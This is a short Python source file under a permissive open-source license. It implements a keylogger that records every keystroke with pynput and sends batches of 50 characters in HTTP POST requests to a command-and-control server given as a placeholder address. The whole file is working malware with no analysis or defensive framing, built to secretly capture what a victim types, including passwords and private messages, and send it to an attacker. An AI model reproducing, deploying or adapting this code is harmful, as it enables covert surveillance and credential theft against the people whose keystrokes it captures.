######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import time
import requests
from pynput import keyboard

C2_URL = "http://C2_IP_OR_URL:8080/receive_keystrokes"

log = ""

def send_to_c2(log):
    try:
        response = requests.post(C2_URL, json={"keystrokes": log})
        if response.status_code == 200:
            print("Keystrokes successfully sent to C2 server.")
        else:
            print(f"Failed to send keystrokes to C2 server. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending keystrokes to C2 server: {e}")

def on_press(key):
    global log
    log += str(key)
    
    if len(log) >= 50:  # adjust this threshold as needed
        send_to_c2(log)
        log = ""

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
